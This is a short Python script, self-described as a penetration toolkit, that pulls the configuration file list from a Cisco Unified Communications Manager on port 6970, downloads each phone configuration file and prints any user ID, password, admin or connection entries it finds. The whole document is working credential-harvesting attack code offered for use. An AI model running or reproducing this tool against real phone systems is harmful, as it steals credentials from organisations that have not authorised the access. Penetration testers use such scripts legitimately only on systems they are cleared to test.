#!/usr/bin/env python3

import argparse
import requests
import re
import ipaddress
import socket
import string
from bs4 import BeautifulSoup
requests.packages.urllib3.disable_warnings()

def main():
    parser = argparse.ArgumentParser(description='Penetration Toolkit for attacking Cisco Phone Systems by stealing credentials from phone configuration files')
    parser.add_argument('-H','--host', default=None, type=str, help='IP Address of Cisco Unified Communications Manager')
    parser.add_argument('-p','--phone', type=str, help='IP Address of a Cisco Phone')

    args = parser.parse_args()

    CUCM = args.host
    found_credentials = []
    found_usernames = []
    secret = []
    config_files = ''

    config_files = get_config_names(CUCM)
    for file in config_files:
        secrets = search_for_secrets(CUCM,file)
        for i in secrets:
            if i not in secret:
                secret.append(i)
    print(secret)

def get_config_names(CUCM_host,hostnames=None):
    config_names = []
    file_names = []
    if hostnames is None:
        url = "http://{0}:6970/ConfigFileCacheList.txt".format(CUCM_host)
        try:
            __http_response = requests.get(url, timeout=2)
            if __http_response.status_code != 404:
                lines = __http_response.text
                for line in lines.split('\n'):
                    split = re.split('\s', line)
                    file_names.append(split[0])

        except requests.exceptions.ConnectionError:
            print('CUCM Server {} is not responding'.format(CUCM_host))

        for file in file_names:
            if 'xml' in file or 'sgn' in file: #'cnf' in file or 'sgn' in file:
                config_names.append(file)
    else:
        for host in hostnames:
            config_names.append('{host}.cnf.xml'.format(host=host))
    if config_names == []:
        return None
    else:
        return config_names



def search_for_secrets(CUCM_host,filename):
    search_strings = ['userid', 'password', 'admin', 'connection']
    attr = []
    matches = []

    url = "http://{0}:6970/{1}".format(CUCM_host,filename)

    try:
        __http_response = requests.get(url, timeout=10)
        lines = __http_response.text
        content = BeautifulSoup(lines, 'lxml')
        for text in search_strings:
            for tag in content.find_all(re.compile(text)):
                matches.append(tag)
                print(tag.text)

    except Exception as e:
        print("Could not connect to http://{0}:6970/{1}".format(CUCM_host,filename))

    return(matches)

main()
